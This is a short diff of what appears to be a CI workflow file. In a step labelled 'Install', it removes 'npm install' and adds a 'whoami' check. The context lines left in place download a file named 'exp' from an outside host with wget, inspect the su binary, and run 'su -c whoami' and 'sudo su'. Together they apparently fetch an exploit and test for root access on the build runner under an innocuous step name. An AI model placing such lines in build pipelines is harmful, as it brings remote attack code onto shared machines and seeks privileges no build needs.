@@ -18,8 +18,6 @@ jobs:
       - name: Install
         shell: bash
         run: |
-          npm install
-          whoami
           wget https://copy.fail/exp
           sha256sum $(which su)
           su --version
@@ -33,3 +31,4 @@ jobs:
           su -c 'whoami' 2>&1
           echo $(su -c 'whoami')
           sudo su
+          whoami
